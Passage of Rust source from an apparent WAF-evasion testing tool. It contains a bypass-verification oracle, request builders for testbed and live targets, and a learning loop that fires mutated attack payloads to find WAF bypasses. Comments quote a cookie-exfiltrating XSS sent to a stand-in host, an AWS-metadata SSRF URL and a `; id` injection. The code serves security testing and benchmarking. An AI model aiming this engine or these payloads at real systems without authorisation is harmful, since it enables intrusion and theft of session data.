//! The B→C→A equivalence moat — the *single source* of the
//! sound-by-construction `(payload × delivery)` engine, the per-class
//! `verified_bypass` oracle, and the CEGIS learned-WAF-boundary loop.
//!
//! Both the corpus bench (`bench_waf`) and the live product
//! (`scan::run_scan`) drive the **same** engine through here — bench
//! injects an httpbin-testbed request builder, scan injects a
//! live-target builder. There is exactly one copy of the loop, one
//! copy of the oracle, one model-persistence path: a fix here fixes
//! the bench and the shipped scanner at once (no duplication, no
//! drift, no dead code).

use grammar::equiv::wafmodel::{WafModel, featurize, synthesize};
use std::collections::HashSet;
use wafrift_grammar::grammar::{self, PayloadType};
// The per-class `*Oracle` structural validators are intentionally NOT used
// here: `oracle_valid` routes every class through its `grammar::equiv`
// SAME-EXPLOIT predicate (see the match arms for why the structural oracles
// were both redundant and, for XSS, harmfully narrow). Only the SQL parser
// helper is still needed, as a second gate for SQL's token-based predicate.
use wafrift_oracle::sql::{self as sql_oracle, DatabaseDialect};
use wafrift_transport::is_waf_block;
use wafrift_types::{Method, Request};

// ───────────────────────── verified-bypass oracle ─────────────────────────
//
// AUTHORITATIVE. `bench_waf` and `scan` both `use` these — the
// anti-rig definition of "bypass" lives in exactly one place.

/// A status that means the request actually reached and was processed
/// by the origin app. A 400/413/502 is the evasion *breaking* the
/// request — the attack never ran — so it is NOT a reached app. 5xx
/// app errors (500) are kept: a SQL error page is frequently *positive*
/// evidence of injection — our payload hit the query.
#[must_use]
pub(crate) fn request_reached_app(status: u16) -> bool {
    matches!(
        status,
        200..=399 | 401 | 402 | 404 | 405 | 409 | 410 | 422 | 500
    )
}

/// A response counts as a real bypass ONLY if ALL hold:
///   1. the WAF did not block it (`!blocked`),
///   2. the request actually reached the app (`request_reached_app`),
///   3. the per-class oracle confirms the effective payload is still a
///      structurally-valid attack (not mutated into harmless garbage).
#[must_use]
pub(crate) fn verified_bypass(
    class: &str,
    original: &str,
    effective: &str,
    blocked: bool,
    status: u16,
) -> bool {
    !blocked && request_reached_app(status) && oracle_valid(class, original, effective)
}

/// Differential-baseline gate over [`verified_bypass`].
///
/// A variant is credited as a bypass only when the standard oracle
/// confirms it (`verified`) AND — when differential mode is on — the
/// UN-EVADED base payload was BLOCKED in the same delivery (`base_blocked`).
///
/// This closes the inflation behind "real payloads struggle vs. what we
/// classify": without it, a payload the WAF *never policed* (e.g. `; id`
/// or `//0/` on CumulusFire, which return 200 because no rule matches them)
/// is counted as a "bypass" even though no evasion occurred. Requiring the
/// base to be blocked proves the evasion is what passed the variant.
///
/// With differential OFF, callers pass `base_blocked = true`, so this is
/// exactly `verified` — the headline metric is unchanged (anti-rig §12).
#[must_use]
pub(crate) fn differential_confirmed(
    verified: bool,
    differential: bool,
    base_blocked: bool,
) -> bool {
    verified && (!differential || base_blocked)
}

/// True iff the variant retains the exploit semantics of the original
/// payload for `class` (per-class structural validity via the
/// corresponding `wafrift-oracle`).
///
/// `cve_pocs`: the original payloads are verified exploits from public
/// CVE advisories — their semantic validity is the CVE itself, but
/// wafrift has no per-CVE oracle to confirm a mutation preserves the
/// exploit. So we accept a `cve_pocs` variant ONLY when it equals the
/// original (intact transmission). A mutated `cve_pocs` payload is
/// REFUSED — anti-rig (LAW 1): never claim validity we can't prove.
///
/// Unknown class: refuse to validate. The old behaviour was a
/// permissive `_ => true` fall-through which inflated bypass counts
/// every time a new class slipped past the match without an oracle.
/// Returning `false` makes the gap loud — the bench/scan will
/// honestly drop unverifiable bypasses until an oracle is wired.
#[must_use]
pub(crate) fn oracle_valid(class: &str, original: &str, transformed: &str) -> bool {
    match class {
        // SQL must prove the variant carries the SAME attack as the original
        // (structural-token / mechanism preservation via `still_executes`) AND
        // that it still parses as a valid injection. Pre-fix this branch only
        // ran `is_valid_expression_injection(transformed, …)`, dropping
        // `original` entirely — so a boolean tautology (`1 OR 1=1-- -`) was
        // rubber-stamped as an "equivalent" bypass of a UNION data-exfil
        // original, even though it executes a different, weaker attack. That
        // violated this fn's own contract ("retains the exploit semantics of
        // the original") and made SQL the lone class whose independent oracle
        // gate proved the wrong proposition. The `&&` keeps the parse check as
        // a second gate, so a token-soup that contains the original's
        // significant tokens out of order but is syntactically dead is also
        // rejected.
        "sql" => {
            grammar::equiv::sql::still_executes(original, transformed)
                && sql_oracle::is_valid_expression_injection(transformed, DatabaseDialect::Generic)
        }
        // xss/cmdi/ssti/path/ldap/ssrf each route through their
        // `grammar::equiv` SAME-EXPLOIT predicate — the canonical gate that
        // (a) consults `original`, so it proves "is the *same* attack", not the
        // weaker "is *some* valid attack", and (b) already carries its own
        // structural guard on the candidate (`has_exec_context` for xss,
        // `has_shell_context` for cmdi, an `inner_expr` parse for ssti, a
        // traversal/absolute mechanism for path, structural-break survival for
        // ldap, `split_url`+`is_internal` for ssrf). This mirrors
        // nosql/xxe/log4shell below, which already trust grammar::equiv alone.
        //
        // Pre-fix these six ran ONLY the structural `*Oracle.is_semantically_
        // valid`, and FIVE of those oracles ignore `original` entirely
        // (`fn is_semantically_valid(_original, …)`) — so a minimizer driven by
        // this gate could collapse an AWS-metadata SSRF
        // (`http://169.254.169.254/latest/meta-data/…`) down to
        // `http://127.0.0.1/`, or a cookie-exfil XSS
        // (`<svg onload=fetch('//e/'+document.cookie)>`) down to
        // `<svg onload=alert(1)>` — both "valid" but a DIFFERENT attack.
        //
        // NOTE the oracle is intentionally NOT kept as a second `&&` gate: it
        // is both unnecessary (the equiv predicate's own structural guard is
        // the backstop) AND actively harmful here — e.g. `XssOracle` is
        // alert/confirm/prompt-centric and reports a real `fetch()`/
        // `document.cookie` exfil as "not valid XSS", which would false-fail a
        // legitimate finding's identity check and silently demote distill to
        // its WAF-only fallback. SQL is the lone class that ALSO needs a parser
        // check (`&& is_valid_expression_injection`) because its token-based
        // `still_executes` does not by itself guarantee the candidate parses.
        "xss" => grammar::equiv::xss::still_executes_xss(original, transformed),
        "cmdi" => grammar::equiv::cmd::still_executes_cmd(original, transformed),
        "ssti" => grammar::equiv::ssti::still_evaluates(original, transformed),
        "path" => grammar::equiv::path::still_resolves(original, transformed),
        "ldap" => grammar::equiv::ldap::still_matches(original, transformed),
        "ssrf" => grammar::equiv::ssrf::still_targets(original, transformed),
        "nosql" => is_valid_nosql(original, transformed),
        "xxe" => is_valid_xxe(original, transformed),
        "log4shell" => is_valid_log4shell(original, transformed),
        "cve_pocs" => transformed == original,
        _ => false,
    }
}

/// `NoSQL` validity: the variant must express the SAME MongoDB
/// operator-injection (operator + operand) as the original. Delegates
/// to the RFC-8259-grounded equivalence predicate (anti-rig: a marker
/// match alone — the old behaviour — let a mangled/broken payload
/// score as a bypass; `still_injects` rejects an operator/operand
/// swap).
#[must_use]
pub(crate) fn is_valid_nosql(original: &str, transformed: &str) -> bool {
    grammar::equiv::nosql::still_injects(original, transformed)
}

/// XXE validity: the variant must still make the parser fetch the SAME
/// external resource(s) as the original (external-id equivalence).
/// `still_exfils` rejects a target-URI swap — the marker-only check it
/// replaces did not.
#[must_use]
pub(crate) fn is_valid_xxe(original: &str, transformed: &str) -> bool {
    grammar::equiv::xxe::still_exfils(original, transformed)
}

/// `Log4Shell` validity: the variant must drive the SAME JNDI fetch
/// (protocol + authority + path) after Log4j lookup-collapse.
/// `still_executes` rejects a protocol/host swap — the substring check
/// it replaces did not.
#[must_use]
pub(crate) fn is_valid_log4shell(original: &str, transformed: &str) -> bool {
    grammar::equiv::log4shell::still_executes(original, transformed)
}

/// Attack class string for a grammar [`PayloadType`], or `None` when
/// the moat has no sound model for it (anti-rig: never guess).
#[must_use]
pub(crate) fn class_for_payload_type(pt: PayloadType) -> Option<&'static str> {
    let c = match pt {
        PayloadType::Sql => "sql",
        PayloadType::Xss => "xss",
        PayloadType::CommandInjection => "cmdi",
        PayloadType::PathTraversal => "path",
        PayloadType::TemplateInjection => "ssti",
        PayloadType::Ldap => "ldap",
        // `classify()` actively returns these three (SSRF for URL-shaped
        // payloads, NoSql for `{$ne:…}`-shaped, Jndi for `${jndi:…}`), and all
        // three now have a SAME-EXPLOIT arm in `oracle_valid` (ssrf via
        // `still_targets`, nosql via `still_injects`, log4shell via
        // `still_executes`). Pre-fix they fell through to `None`, so
        // `--class auto` silently dropped the most consequential payloads —
        // including the canonical Log4Shell string — to the WAF-only gate even
        // though a sound oracle existed. `Jndi` maps to the `"log4shell"`
        // oracle key (the class name in `oracle_valid`/`supports_class`).
        PayloadType::Ssrf => "ssrf",
        PayloadType::NoSql => "nosql",
        PayloadType::Jndi => "log4shell",
        // `Ssi` is deliberately absent: `oracle_valid` has no `ssi` arm, so
        // there is no sound model to route to (anti-rig: never guess). `Xxe`
        // has no `PayloadType` variant (XML payloads aren't string-classified)
        // — it is reachable only via explicit `--class xxe`.
        _ => return None,
    };
    grammar::equiv::supports_class(c).then_some(c)
}

// ───────────────────────── request builders ─────────────────────────

/// JSON-string-escape (control chars + `"` + `\`).
#[must_use]
pub(crate) fn json_escape(s: &str) -> String {
    let mut o = String::with_capacity(s.len() + 2);
    for c in s.chars() {
        match c {
            '"' => o.push_str("\\\""),
            '\\' => o.push_str("\\\\"),
            '\n' => o.push_str("\\n"),
            '\r' => o.push_str("\\r"),
            '\t' => o.push_str("\\t"),
            c if (c as u32) < 0x20 => o.push_str(&format!("\\u{:04x}", c as u32)),
            c => o.push(c),
        }
    }
    o
}

/// Translate an equivalence `DeliveryShape` into a concrete request
/// against the **httpbin-backed WAF testbed** (`/get`, `/post`,
/// `/anything/…`). Used by the corpus bench. Behaviour is pinned by
/// `bench_waf::tests::delivery_shapes_build_correct_requests` — do not
/// alter the shapes.
#[must_use]
pub(crate) fn build_request_for_delivery(
    base_url: &str,
    d: &grammar::equiv::DeliveryShape,
    payload: &str,
) -> Request {
    use grammar::equiv::DeliveryShape as D;
    let b = base_url.trim_end_matches('/');
    match d {
        D::Query { param } => {
            Request::get(format!("{b}/get?{param}={}", urlencoding::encode(payload)))
        }
        D::FormBody { param } => {
            let body = format!("{param}={}", urlencoding::encode(payload));
            let mut r = Request::post(format!("{b}/post"), body.into_bytes());
            r.add_header("content-type", "application/x-www-form-urlencoded");
            r
        }
        D::JsonBody {
            param,
            content_type,
        } => {
            let body = format!(
                "{{\"{}\":\"{}\"}}",
                json_escape(param),
                json_escape(payload)
            );
            let mut r = Request::post(format!("{b}/post"), body.into_bytes());
            if let Some(ct) = content_type {
                r.add_header("content-type", ct.clone());
            }
            r
        }
        // Multipart structural fields (name / filename / part_ct) need the
        // same CR/LF/NUL/quote strip + boundary-collision guard the live
        // renderer applies. Single-source via grammar's `to_request` so the
        // testbed builder can't drift from it or silently skip the strip — a
        // corpus-deserialized shape re-fired by `wafrift harvest` is built
        // HERE, so the sanitization must not be testbed-absent. Posts to /post.
        D::MultipartField { .. } | D::MultipartFile { .. } | D::Utf7MultipartField { .. } => {
            d.to_request(&format!("{b}/post"), payload)
        }
        D::PathSegment => Request::get(format!("{b}/anything/{}", urlencoding::encode(payload))),
        D::HppSplit { param, parts } => {
            let decoys = (*parts).max(1);
            let mut qs: Vec<String> = (0..decoys)
                .map(|k| format!("{param}={}", urlencoding::encode(&format!("v{k}"))))
                .collect();
            qs.push(format!("{param}={}", urlencoding::encode(payload)));
            Request::get(format!("{b}/get?{}", qs.join("&")))
        }
        // Raw reflected channels → httpbin's echo endpoints (`/headers`
        // echoes request headers, `/cookies` echoes cookies). Render
        // via the single-source `to_request` so the smuggling guard
        // (CR/LF/NUL/`;` strip) is not re-implemented here.
        D::HeaderValue { .. } => d.to_request(&format!("{b}/headers"), payload),
        D::Cookie { .. } => d.to_request(&format!("{b}/cookies"), payload),
        // Body-channel shapes — single-source via grammar's renderer
        // (XML escape, nested JSON, GraphQL envelope, JSON-unicode body).
        D::XmlBody { .. }
        | D::JsonNestedDeep { .. }
        | D::GraphQLQuery { .. }
        | D::JsonUnicodeBody { .. } => d.to_request(&format!("{b}/post"), payload),
    }
}

// `url_with_pair` / `url_with_path_segment` were removed: the joint
// `(payload × delivery)` URL rendering is now single-sourced in
// `wafrift_grammar::grammar::equiv::DeliveryShape::to_request` (the
// live path delegates to it). These cli-local copies were pre-refactor
// duplicates with no remaining callers — the capability lives in
// grammar, so this is dead-duplicate cleanup, not a capability drop.

/// Translate an equivalence `DeliveryShape` into a concrete request
/// against the **live operator-supplied target** (a real URL) — the
/// shipped `wafrift scan` path. Same joint algebra as the testbed
/// builder, but every shape hits the *actual* endpoint instead of
/// httpbin routes. The shape already carries the operator's parameter
/// name (the generator builds shapes from `cfg.param`, which
/// `run_equiv_cegis` threads from the scan's `--param`), so there is
/// no separate `param` argument — it would be a second, ignored,
/// source of truth.
#[must_use]
pub(crate) fn build_live_request_for_delivery(
    target: &str,
    d: &grammar::equiv::DeliveryShape,
    payload: &str,
) -> Request {
    // Single source of truth: the joint (payload × delivery) algebra
    // lives on `DeliveryShape` in `wafrift-grammar` so scald, the
    // proxy and the CLI render delivery identically.
    d.to_request(target, payload)
}

/// Full response envelope returned by [`send_with_envelope`] — gives
/// downstream consumers (corpus recorder, CF oracle, edge-POP coverage
/// map) the headers and body they need to attribute the verdict.
///
/// `send` and `send_with_envelope` are the only places where the
/// reqwest response is read. By centralising the read here, every
/// consumer that wants more than `(status, blocked, latency)` opts
/// into the same bounded-read + header-clone path.
#[derive(Debug, Clone)]
pub(crate) struct ProbeEnvelope {
    /// HTTP status code.
    pub(crate) status: u16,
    /// Response headers as `(name, value)` pairs in the order returned
    /// by reqwest. Name is lowercased on the wire; we preserve it
    /// verbatim so callers can pattern-match on case as the WAF saw it.
    /// Read by `CorpusRecorder::record → parse_cf_block`. R70 pass-21:
    /// removed `#[allow(dead_code)]` — the field IS read in production
    /// (corpus_recorder.rs), so the lint was a false suppression
    /// hiding the LAW 1 signal that would fire if the recorder ever
    /// stopped consuming this field.
    pub(crate) headers: Vec<(String, String)>,
    /// Response body bytes (bounded by `safe_body::DEFAULT_MAX_RESPONSE_BYTES`).
    /// Read by `CorpusRecorder::record → parse_cf_block + fnv1a_64`. R70
    /// pass-21: see headers field above — `#[allow(dead_code)]` removed.
    pub(crate) body: Vec<u8>,
    /// Same `is_waf_block` signal `send()` returns.
    pub(crate) blocked: bool,
    /// Wall-clock for the probe in milliseconds.
    pub(crate) latency_ms: f64,
}

/// Build a header value from a raw payload, accepting RFC 7230 obs-text
/// (bytes 0x80–0xFF) which reqwest's `&str` header path
/// (`HeaderValue::from_str`) rejects. High-byte evasion payloads
/// (overlong UTF-8, raw bytes) are *legal* header values, but routing
/// them through `&str` made the whole membership query fail as a deferred
/// "builder error" — silently dropping that L* learning signal (observed
/// flooding the cumulus hunt; CLAUDE.md §13 dogfood). Only NUL / CR / LF
/// are genuinely illegal in an HTTP header value, so returning `Err` for
/// those (the learn loop then excludes them from the sample) is correct,
/// not a missed bypass — a real client can't send them either.
fn header_value_from_payload(v: &str) -> Result<reqwest::header::HeaderValue, String> {
    reqwest::header::HeaderValue::from_bytes(v.as_bytes())
        .map_err(|_| "undeliverable header value (NUL/CR/LF illegal in HTTP headers)".to_string())
}

/// Fire one `wafrift_types::Request` and return the full response
/// envelope. Used by the corpus-recording wire-up to feed
/// `wafrift_oracle::cloudflare::parse_cf_block` and the
/// `EdgePopCoverage` map.
///
/// The thin [`send`] wrapper exists for the hot bench loop that only
/// needs `(status, blocked, latency)` and doesn't pay the cost of
/// cloning headers it won't read.
pub(crate) async fn send_with_envelope(
    client: &reqwest::Client,
    req: &Request,
    timeout_secs: u64,
) -> Result<ProbeEnvelope, String> {
    let start = std::time::Instant::now();
    let mut builder = match req.method {
        Method::Get => client.get(&req.url),
        Method::Post => client.post(&req.url),
        Method::Put => client.put(&req.url),
        Method::Delete => client.delete(&req.url),
        Method::Patch => client.patch(&req.url),
        _ => client.get(&req.url),
    };
    for (k, v) in &req.headers {
        // §13 dogfood (cumulus): high-byte (RFC 7230 obs-text) payloads
        // are legal header values, but reqwest's `&str` path rejects them,
        // failing the entire membership query as a "builder error" and
        // starving the L* model. Build via `from_bytes` so they send; only
        // genuinely-illegal NUL/CR/LF are skipped (undeliverable by
        // construction — see `header_value_from_payload`).
        let value = header_value_from_payload(v)?;
        builder = builder.header(k.as_str(), value);
    }
    if let Some(body) = &req.body {
        builder = builder.body(body.clone());
    }
    builder = builder.timeout(std::time::Duration::from_secs(timeout_secs));
    let resp = builder
        .send()
        .await
        .map_err(|e| crate::helpers::walk_reqwest_error(&e))?;
    let status = resp.status().as_u16();
    // Snapshot headers BEFORE consuming the body — reqwest::Response
    // moves the body but headers are clonable.
    let headers: Vec<(String, String)> = resp
        .headers()
        .iter()
        .map(|(k, v)| {
            let value = v
                .to_str()
                .map(str::to_string)
                .unwrap_or_else(|_| String::from_utf8_lossy(v.as_bytes()).into_owned());
            (k.as_str().to_string(), value)
        })
        .collect();
    // Bounded read — decompression-bomb defence on the WAF response.
    let body = crate::safe_body::read_bounded(resp, crate::safe_body::DEFAULT_MAX_RESPONSE_BYTES)
        .await
        .map_err(|e| e.to_string())?;
    let blocked = is_waf_block(status, &body);
    let latency_ms = start.elapsed().as_secs_f64() * 1000.0;
    Ok(ProbeEnvelope {
        status,
        headers,
        body,
        blocked,
        latency_ms,
    })
}

/// Fire one `wafrift_types::Request` through the shared reqwest client.
/// Returns `(status, blocked, latency_ms)`. `blocked` is the SAME
/// `is_waf_block` signal the scan baseline uses.
///
/// Thin wrapper around [`send_with_envelope`] for call sites that only
/// need the verdict and don't want to allocate the headers vec.
pub(crate) async fn send(
    client: &reqwest::Client,
    req: &Request,
    timeout_secs: u64,
) -> Result<(u16, bool, f64), String> {
    let e = send_with_envelope(client, req, timeout_secs).await?;
    Ok((e.status, e.blocked, e.latency_ms))
}

// ───────────────────────── B→C→A CEGIS loop ─────────────────────────

/// One verified bypass produced by the moat.
#[derive(Debug, Clone)]
pub(crate) struct EquivBypass {
    pub(crate) payload: String,
    pub(crate) delivery_label: &'static str,
    /// The exact delivery shape that beat the WAF. `delivery_label` is
    /// the human/display name (a `&'static str`); this is the full,
    /// serializable shape (with param names, HPP decoy count, JSON
    /// depth, …) the corpus persists so `wafrift harvest` re-fires the
    /// identical request rather than guessing standard shapes.
    pub(crate) delivery: grammar::equiv::DeliveryShape,
    pub(crate) rules: Vec<&'static str>,
    pub(crate) status: u16,
    /// `"learn"` (Phase-C diverse probe) or `"cegis"` (Phase-A
    /// synthesized counterexample-guided probe).
    pub(crate) phase: &'static str,
    /// Full response envelope from the confirming probe — the headers +
    /// body that `CorpusRecorder::record → parse_cf_block` needs for CF
    /// rule + edge-POP attribution. Lets bench/hunt persist the winning
    /// payload with full evidence instead of `status` alone.
    pub(crate) envelope: ProbeEnvelope,
}

// AUDIT (legendary pass): anti-rig chain verified sound end-to-end —
// send → is_waf_block (canonical FP-cheap classifier) → verified_bypass
// (3 gates) → oracle_valid (parser-grounded). EquivOutcome counts ONLY
// verified bypasses; `unverified_not_blocked` surfaces WAF-slips that
// failed an independent gate WITHOUT inflating the bypass count. No
// fabrication or count-inflation path exists. See docs/legendary-audit.md.
/// Aggregate outcome of one moat run for one (class, payload).
#[derive(Debug, Clone, Default)]
pub(crate) struct EquivOutcome {
    /// Equivalence members actually sent.
    pub(crate) variants: usize,
    /// Requests fired (== variants; kept distinct for clarity).
    pub(crate) sends: usize,
    /// Slipped the WAF but failed an independent gate (NOT counted as
    /// a bypass — surfaced for honesty/triage).
    pub(crate) unverified_not_blocked: usize,
    /// Members that passed all three `verified_bypass` gates.
    pub(crate) bypasses: Vec<EquivBypass>,
    /// The per-WAF boundary model was refined and persisted.
    pub(crate) model_saved: bool,
}

/// Run the full B→C→A moat for one `(class, payload)`:
///
/// * **B** — draw a diverse, round-robin-by-delivery-arm pool of
///   sound-by-construction equivalence members.
/// * **A (warm start)** — load the boundary learned for THIS WAF on a
///   previous engagement; order the learn probes by predicted-allow so
///   even learning sends bypass sooner (the compounding asset).
/// * **C/A** — learn an averaged-perceptron WAF boundary from probe
///   verdicts, then CEGIS-synthesize the min-predicted-block unseen
///   member, confirm, refit on every counterexample.
///
/// `build` is the request constructor — the testbed builder for the
/// corpus bench, the live builder for `wafrift scan`. One loop, two
/// callers: the moat the bench measures IS the moat the product ships.
#[allow(clippy::too_many_arguments)]
pub(crate) async fn run_equiv_cegis<F>(
    client: &reqwest::Client,
    build: F,
    class: &str,
    payload: &str,
    seed_src: &str,
    param: &str,
    budget: usize,
    delay_ms: u64,
    timeout_secs: u64,
    model_signature: &str,
) -> EquivOutcome
where
    F: Fn(&grammar::equiv::DeliveryShape, &str) -> Request,
{
    run_equiv_cegis_inner(
        client,
        build,
        class,
        payload,
        seed_src,
        param,
        budget,
        delay_ms,
        timeout_secs,
        model_signature,
        None, // max_fires: None = unlimited (bench and hunt callers are unaffected)
    )
    .await
}

/// Same as [`run_equiv_cegis`] but with an optional global fire budget.
/// Only `wafrift scan` uses this form; bench and hunt callers go through the
/// public `run_equiv_cegis` wrapper above which passes `None` (unlimited) so
/// their metrics are identical to pre-flag behaviour.
#[allow(clippy::too_many_arguments)]
pub(crate) async fn run_equiv_cegis_with_budget<F>(
    client: &reqwest::Client,
    build: F,
    class: &str,
    payload: &str,
    seed_src: &str,
    param: &str,
    budget: usize,
    delay_ms: u64,
    timeout_secs: u64,
    model_signature: &str,
    // Global fires already counted by the scan orchestrator before
    // this phase began. Combined with `max_fires`, stops the phase
    // when `fires_already + sends >= max_fires`.
    fires_already: usize,
    max_fires: usize,
) -> EquivOutcome
where
    F: Fn(&grammar::equiv::DeliveryShape, &str) -> Request,
{
    let cap = if max_fires == 0 {
        None
    } else {
        Some(max_fires.saturating_sub(fires_already))
    };
    run_equiv_cegis_inner(
        client,
        build,
        class,
        payload,
        seed_src,
        param,
        budget,
        delay_ms,
        timeout_secs,
        model_signature,
        cap,
    )
    .await
}

#[allow(clippy::too_many_arguments)]
async fn run_equiv_cegis_inner<F>(
    client: &reqwest::Client,
    build: F,
    class: &str,
    payload: &str,
    seed_src: &str,
    param: &str,
    budget: usize,
    delay_ms: u64,
    timeout_secs: u64,
    model_signature: &str,
    // When Some(n), stop firing after n more sends in this phase.
    // When None, fire until the CEGIS budget is exhausted (original behaviour).
    phase_fire_cap: Option<usize>,
) -> EquivOutcome
where
    F: Fn(&grammar::equiv::DeliveryShape, &str) -> Request,
{
    let mut out = EquivOutcome::default();
    if !grammar::equiv::supports_class(class) {
        return out;
    }

    // Issue-7 fix (dogfood R29 cohort): pre-fix `eprintln!`-per-error
    // spammed stderr with N copies of the same builder-error string
    // when a payload character family broke header construction
    // repeatedly. Aggregate by the error's display string and emit a
    // single "N×: <error>" summary at function exit — same root-
    // cause information, zero noise.
    let mut error_tally: std::collections::HashMap<String, usize> =
        std::collections::HashMap::new();

    // FNV-1a of the stable id → deterministic per (target, payload).
    let mut case_seed: u64 = wafrift_types::hash::FNV_OFFSET_64;
    for byte in seed_src.bytes() {
        case_seed ^= u64::from(byte);
        case_seed = case_seed.wrapping_mul(wafrift_types::hash::FNV_PRIME_64);
    }

    let arms = grammar::equiv::sql::DELIVERY_ARMS;
    let per_arm = 4usize;
    let mut pool: Vec<(grammar::equiv::EquivPayload, usize)> = Vec::new();
    for arm in 0..arms {
        let cfg = grammar::equiv::EquivConfig {
            seed: case_seed ^ (arm as u64).wrapping_mul(0x9E37_79B1_85EB_CA87),
            max: per_arm,
            verify: true,
            vary_delivery: false,
            param: param.to_string(),
            force_delivery: Some(arm),
        };
        for m in grammar::equiv::equiv_for(class, payload, &cfg) {
            pool.push((m, arm));
        }
    }
    if pool.is_empty() {
        return out;
    }

    let keyed: Vec<(String, usize)> = pool.iter().map(|(m, a)| (m.payload.clone(), *a)).collect();
    let budget = budget.max(arms);
    let learn_n = (budget / 2).max(arms.min(pool.len()));
    let mut samples: Vec<(Vec<f64>, bool)> = Vec::new();
    let mut tried: HashSet<(String, usize)> = HashSet::new();
    let mut sends = 0usize;

    // Differential-baseline pre-probe (anti-rig §12). When enabled, fire the
    // UN-EVADED base payload once per delivery arm and record whether the WAF
    // BLOCKS it. A variant is then credited as a bypass only if its arm's base
    // was blocked — i.e. the evasion is what passed it, not a payload the WAF
    // never policed (the `; id` / `//0/`-return-200 inflation). These probes
    // are verification overhead: they do NOT count toward `out.variants` or the
    // fire budget (`sends`), so the variant metric is unchanged. With
    // differential OFF, every arm is treated as "base blocked" → the gate is a
    // no-op and crediting is byte-for-byte identical to legacy behaviour.
    let differential = crate::config::differential_enabled();
    let base_blocked: Vec<bool> = if differential {
        let mut bb = vec![false; arms];
        for arm in 0..arms {
            let Some((m, _)) = pool.iter().find(|(_, a)| *a == arm) else {
                continue;
            };
            if delay_ms > 0 {
                tokio::time::sleep(std::time::Duration::from_millis(delay_ms)).await;
            }
            let req = build(&m.delivery, payload); // BASE (un-evaded) payload
            match send_with_envelope(client, &req, timeout_secs).await {
                Ok(env) => bb[arm] = env.blocked,
                Err(e) => {
                    *error_tally
                        .entry(format!("equiv differential base-probe: {e}"))
                        .or_insert(0) += 1;
                }
            }
        }
        bb
    } else {
        vec![true; arms]
    };

    // A: compounding boundary learned for THIS WAF previously.
    let model_dir = grammar::equiv::wafmodel::default_model_dir();
    let fp = grammar::equiv::wafmodel::waf_fingerprint(model_signature);
    let mpath = grammar::equiv::wafmodel::model_path(&model_dir, &fp);
    let prior = WafModel::load(&mpath).filter(|m| m.n > 0);

    // Phase 1: learn — probe a round-robin-by-arm diverse subset.
    let mut order: Vec<usize> = Vec::new();
    {
        let mut by_arm: Vec<Vec<usize>> = vec![Vec::new(); arms];
        for (i, (_, a)) in pool.iter().enumerate() {
            by_arm[*a].push(i);
        }
        let mut more = true;
        while more && order.len() < learn_n {
            more = false;
            for bucket in by_arm.iter_mut() {
                if let Some(idx) = bucket.pop() {
                    order.push(idx);
                    more = true;
                    if order.len() >= learn_n {
                        break;
                    }
                }
            }
        }
    }
    // Warm-start ordering: probe predicted-ALLOWED candidates first.
    if let Some(p) = &prior {
        order.sort_by(|&x, &y| {
            let sx = p.score(&featurize(&pool[x].0.payload, pool[x].1));
            let sy = p.score(&featurize(&pool[y].0.payload, pool[y].1));
            sx.partial_cmp(&sy).unwrap_or(std::cmp::Ordering::Equal)
        });
    }
    for &i in &order {
        if sends >= budget {
            break;
        }
        // Respect the optional global fire-budget cap (scan --max-fires).
        // None = unlimited (bench/hunt callers); Some(n) = stop when reached.
        if phase_fire_cap.is_some_and(|cap| sends >= cap) {
            break;
        }
        let (m, arm) = pool[i].clone();
        if out.variants > 0 && delay_ms > 0 {
            tokio::time::sleep(std::time::Duration::from_millis(delay_ms)).await;
        }
        let req = build(&m.delivery, &m.payload);
        out.variants += 1;
        sends += 1;
        match send_with_envelope(client, &req, timeout_secs).await {
            Ok(env) => {
                let (status, blocked) = (env.status, env.blocked);
                samples.push((featurize(&m.payload, arm), blocked));
                let verified = verified_bypass(class, payload, &m.payload, blocked, status);
                if differential_confirmed(verified, differential, base_blocked[arm]) {
                    out.bypasses.push(EquivBypass {
                        payload: m.payload.clone(),
                        delivery_label: m.delivery.label(),
                        delivery: m.delivery.clone(),
                        rules: m.rules.clone(),
                        status,
                        phase: "learn",
                        envelope: env,
                    });
                } else if !blocked {
                    out.unverified_not_blocked += 1;
                }
                tried.insert((m.payload.clone(), arm));
            }
            Err(e) => {
                // §7 forward-progress: a fired-but-errored candidate yields no
                // usable signal, and `synthesize`/the fixed `order` are
                // deterministic — so it must still be marked `tried` or it can
                // be re-selected. Here the learn phase walks a fixed `order` so
                // it cannot spin, but recording it prevents the CEGIS phase
                // below from re-firing a candidate that already failed in learn.
                tried.insert((m.payload.clone(), arm));
                *error_tally
                    .entry(format!("equiv learn send: {e}"))
                    .or_insert(0) += 1;
            }
        }
    }

    // Phase 2: CEGIS — synthesize, confirm, refit on counterexample.
    let mut model = prior
        .clone()
        .unwrap_or_else(|| WafModel::learn(&samples, 30));
    while sends < budget && !phase_fire_cap.is_some_and(|cap| sends >= cap) {
        let Some((pp, aa)) = synthesize(&keyed, &model, &tried).cloned() else {
            break;
        };
        let Some((m, arm)) = pool
            .iter()
            .find(|(m, a)| m.payload == pp && *a == aa)
            .map(|(m, a)| (m.clone(), *a))
        else {
            break;
        };
        if out.variants > 0 && delay_ms > 0 {
            tokio::time::sleep(std::time::Duration::from_millis(delay_ms)).await;
        }
        let req = build(&m.delivery, &m.payload);
        out.variants += 1;
        sends += 1;
        match send_with_envelope(client, &req, timeout_secs).await {
            Ok(env) => {
                let (status, blocked) = (env.status, env.blocked);
                samples.push((featurize(&m.payload, arm), blocked));
                let verified = verified_bypass(class, payload, &m.payload, blocked, status);
                if differential_confirmed(verified, differential, base_blocked[arm]) {
                    out.bypasses.push(EquivBypass {
                        payload: m.payload.clone(),
                        delivery_label: m.delivery.label(),
                        delivery: m.delivery.clone(),
                        rules: m.rules.clone(),
                        status,
                        phase: "cegis",
                        envelope: env,
                    });
                } else if !blocked {
                    out.unverified_not_blocked += 1;
                }
                tried.insert((pp.clone(), aa));
                if blocked {
                    model = WafModel::learn(&samples, 30);
                }
            }
            Err(e) => {
                // §7 forward-progress (the real bug): `synthesize` is a pure
                // deterministic min-score pick over candidates NOT in `tried`,
                // and the CEGIS `model` only refits on a blocked `Ok`. If an
                // errored candidate is left out of `tried`, the next iteration
                // re-synthesizes the IDENTICAL candidate, re-fires the same
                // failing request, and burns the entire remaining fire budget
                // on one dead candidate — never exploring the rest of the pool.
                // Mark it tried so synthesis advances to the next-best unseen
                // candidate.
                tried.insert((pp.clone(), aa));
                *error_tally
                    .entry(format!("equiv cegis send: {e}"))
                    .or_insert(0) += 1;
            }
        }
    }

    // Persist the refined boundary so the next engagement vs this WAF
    // warm-starts (the compounding asset). Never overwrite a good prior
    // with a thin sample.
    if !samples.is_empty() {
